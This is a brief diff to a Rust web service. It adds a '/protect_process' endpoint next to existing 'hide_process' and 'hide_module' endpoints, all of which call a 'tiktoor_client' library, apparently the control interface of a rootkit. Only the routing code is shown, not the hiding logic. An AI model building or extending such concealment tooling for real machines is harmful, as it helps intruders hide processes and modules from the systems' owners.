@@ -36,6 +36,12 @@ async fn hide_process(parameter: web::Json<HideProcessParameter>) -> impl Respon
     HttpResponse::Ok()
 }
 
+#[post("/protect_process")]
+async fn protect_process(parameter: web::Json<HideProcessParameter>) -> impl Responder {
+    tiktoor_client::protect_process(parameter.pid);
+    HttpResponse::Ok()
+}
+
 #[post("/hide_module")]
 async fn hide_module() -> impl Responder {
     tiktoor_client::hide_module();
